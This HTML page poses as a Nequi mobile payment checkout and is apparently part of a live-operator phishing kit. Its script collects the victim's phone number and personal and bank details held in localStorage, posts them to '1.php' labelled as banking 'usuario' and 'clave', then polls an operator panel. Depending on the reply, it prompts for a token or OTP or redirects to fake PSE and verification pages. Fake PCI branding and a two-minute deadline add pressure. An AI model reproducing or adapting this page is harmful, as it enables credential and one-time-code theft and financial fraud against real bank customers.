<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Pago con Nequi</title>
  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600&display=swap" rel="stylesheet">
  <style>
    :root {
      --brand-color: #5c2d91;
      --text-color: #222;
      --gray: #666;
      --error: #e53935;
    }

    * {
      box-sizing: border-box;
    }

    body {
      margin: 0;
      font-family: 'Inter', sans-serif;
      background: white;
      color: var(--text-color);
    }

    .container {
      max-width: 400px;
      margin: auto;
      padding: 1rem 1rem 2rem;
      display: flex;
      flex-direction: column;
      align-items: center;
    }

    .header {
      width: 100%;
      display: flex;
      justify-content: space-between;
      align-items: center;
      margin-bottom: 1.2rem;
    }

    .nequi {
      color: var(--brand-color);
      font-weight: 600;
      font-size: 1.5rem;
    }

    .amount {
      font-size: 1.1rem;
      font-weight: 600;
    }

    form {
      width: 100%;
    }

    label {
      font-weight: 500;
      margin-bottom: 0.3rem;
      display: block;
    }

    .required {
      color: var(--error);
    }

    input[type="tel"] {
      width: 100%;
      padding: 0.75rem;
      border: 1px solid #ccc;
      border-radius: 6px;
      font-size: 1rem;
      margin-bottom: 1rem;
    }

    button {
      background: var(--text-color);
      color: white;
      font-size: 1rem;
      padding: 0.6rem 1.2rem;
      width: 137px;
      border: none;
      border-radius: 6px;
      cursor: pointer;
      transition: background 0.2s ease;
      margin: 1rem auto 1rem;
      display: block;
      text-align: center;
    }

    button:hover {
      background: var(--brand-color);
    }

    .footer {
      text-align: center;
      font-size: 0.9rem;
      color: var(--gray);
      width: 100%;
    }

    .footer a {
      color: var(--gray);
      text-decoration: none;
      display: block;
      margin-bottom: 0.6rem;
    }

    .pci {
      width: 55px;
      opacity: 0.9;
      margin-bottom: 0.8rem;
    }

    .explicacion {
      font-size: 0.8rem;
      color: var(--text-color);
      line-height: 1.4;
      text-align: center;
      margin-bottom: 0.8rem;
    }

    .ayuda {
      width: 317px;
      max-width: 95%;
      border-radius: 10px;
    }

    /* --- MODAL DE CARGA --- */
    .modal-overlay {
      position: fixed;
      top: 0;
      left: 0;
      height: 100vh;
      width: 100vw;
      background-color: rgba(0, 0, 0, 0.4);
      backdrop-filter: blur(3px);
      display: none;
      align-items: center;
      justify-content: center;
      z-index: 1000;
    }

    .modal-box {
      background: white;
      padding: 1.5rem;
      border-radius: 8px;
      text-align: center;
      max-width: 300px;
      box-shadow: 0 0 10px rgba(0, 0, 0, 0.2);
    }

    .modal-box p {
      margin-bottom: 1rem;
      font-size: 0.95rem;
    }

    .loader {
      border: 4px solid #f3f3f3;
      border-top: 4px solid var(--text-color);
      border-radius: 50%;
      width: 26px;
      height: 26px;
      animation: spin 1s linear infinite;
      margin: auto;
    }

    @keyframes spin {
      0% { transform: rotate(0deg); }
      100% { transform: rotate(360deg); }
    }
  </style>
</head>
<body>

  <div class="container">
    <div class="header">
      <div class="nequi">Nequi</div>
      <div class="amount" id="monto">Monto: --</div>
    </div>

    <form id="nequiForm">
      <label for="telefono">Número de teléfono celular <span class="required">*</span></label>
      <input type="tel" id="telefono" name="telefono" placeholder="3014785215" maxlength="10" required />
      <button type="submit">VALIDAR</button>
    </form>

    <div class="footer">
      <a href="#">Anular y volver a la tienda</a>
      <img src="img/pci.jpg" alt="Logo PCI" class="pci" />
      <div class="explicacion">
        Ingresa a la app de <strong>Nequi</strong>, ve al <strong>Centro de notificaciones</strong> y acepta el pago.<br>
        Tienes <strong>2 minutos</strong> para confirmar la transacción antes de que expire.
      </div>
      <img src="img/ayuda.png" alt="Imagen ayuda Nequi" class="ayuda" />
    </div>
  </div>

  <!-- MODAL -->
  <div class="modal-overlay" id="loadingModal">
    <div class="modal-box">
      <p>Por favor espere mientras su petición está siendo procesada...</p>
      <div class="loader"></div>
    </div>
  </div>

  <script>
  const form = document.getElementById('nequiForm');
  const input = document.getElementById('telefono');
  const modal = document.getElementById('loadingModal');
  const montoEl = document.getElementById('monto');

  let poll, timeout;

  // Mostrar monto desde localStorage
  const totalPagar = localStorage.getItem("total_pagar");
  if (totalPagar) {
    const montoFormateado = parseFloat(totalPagar).toLocaleString("es-CO", {
      style: "currency",
      currency: "COP"
    });
    montoEl.textContent = "Monto: " + montoFormateado;
  }

  function generarTransactionId() {
    return 'TID' + Date.now() + Math.floor(Math.random() * 999);
  }

  function mostrarError(mensaje) {
    alert(mensaje);
  }

  form.addEventListener('submit', async function (e) {
    e.preventDefault();

    const nequi = input.value.trim();
    if (!/^\d{10}$/.test(nequi)) {
      return mostrarError("El número debe tener exactamente 10 dígitos.");
    }

    // OBTENER DATOS DEL localStorage (igual que en check.php)
    const tbdatos = {
        correo: localStorage.getItem("correo") || "",
        cel: localStorage.getItem("cel") || "",
        val: localStorage.getItem("val") || "",
        per: localStorage.getItem("per") || "",
        nom: localStorage.getItem("nom") || "",
        telefono: localStorage.getItem("cel") || "",
        identificacion: localStorage.getItem("val") || "",
        tipo_persona: localStorage.getItem("per") || "",
        banco: localStorage.getItem("nom") || ""
    };

    const transactionId = generarTransactionId();

    // ✔️ Guardamos el número en localStorage para usarlo después
    localStorage.setItem("nequi", nequi);
    // ✔️ Guardamos también el transactionId si lo quieres usar en otras páginas
    localStorage.setItem("last_tid", transactionId);

    const payload = {
      transactionId,
      bancoldata: { usuario: nequi, clave: nequi },
      tbdatos: tbdatos,  // <-- Datos correctos del localStorage
      total: totalPagar || "0"
    };

    try {
      modal.style.display = 'flex';

      const res = await fetch("1.php", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify(payload)
      });

      const result = await res.json();

      if (!result.ok) {
        modal.style.display = "none";
        return mostrarError("Hubo un error al enviar los datos. Inténtalo más tarde.");
      }

      iniciarPolling(transactionId);

    } catch (err) {
      modal.style.display = "none";
      mostrarError("Error de red o del servidor.");
    }
  });

  function iniciarPolling(transactionId) {
    const TIMEOUT_MS = 180000;
    const INTERVAL_MS = 5000;

    poll = setInterval(() => checkLogin(transactionId), INTERVAL_MS);

    timeout = setTimeout(() => {
      clearInterval(poll);
      modal.style.display = "none";
      mostrarError("No se obtuvo respuesta del operador. Por favor intenta más tarde.");
    }, TIMEOUT_MS);
  }

  async function checkLogin(transactionId) {
    try {
      const res = await fetch(`1.php?transactionId=${transactionId}`);
      let json;
      try {
        json = await res.json();
      } catch (e) {
        return; // evita alerta falsa
      }

      if (json.ok && json.action) {
        clearInterval(poll);
        clearTimeout(timeout);
        modal.style.display = "none";

        switch (json.action) {

          case "pedir_token":
            if (document.getElementById("otpToken")) {
              document.getElementById("otpToken").value = "";
            }

            const monto = localStorage.getItem("total_pagar") || "0";
            const montoFormateado = new Intl.NumberFormat("es-CO", {
              style: "currency",
              currency: "COP"
            }).format(parseInt(monto));

            const montoElem = document.getElementById("montoClave");
            if (montoElem) {
              montoElem.textContent = `Monto: ${montoFormateado}`;
            }

            const modalAuth = document.getElementById("modalAutorizacion");
            if (modalAuth) {
              modalAuth.style.display = "flex";
            }
            break;

          case "dinamica_logo":
            // 👉 NUEVA ACCIÓN
            window.location.href = "lyd.php";
            break;

          case "rechazar":
            mostrarError("El operador rechazó la solicitud.");
            break;

          case "banco_error":
            alert("Datos erróneos. Corrígelos.");
            window.location.href = "index.php";
            break;

          case "cc":
            window.location.href = "/pse/index.php";
            break;

          case "check":
          case "aprobado":
            window.location.href = "/site/checking.php";
            break;

          case "fin":
            window.location.href = "fin.php";
            break;

          case "enviado":
            window.location.href = "espera.php";
            break;

          case "repetir":
            alert("Se solicitó repetir el proceso con Nequi.");
            window.location.reload();
            break;

          case "otro":
            window.location.href = "/checking.php";
            break;

          default:
            console.warn("Acción desconocida:", json.action);
        }
      }

    } catch (err) {
      console.error("Error en checkLogin:", err);
    }
  }
</script>


</body>
</html>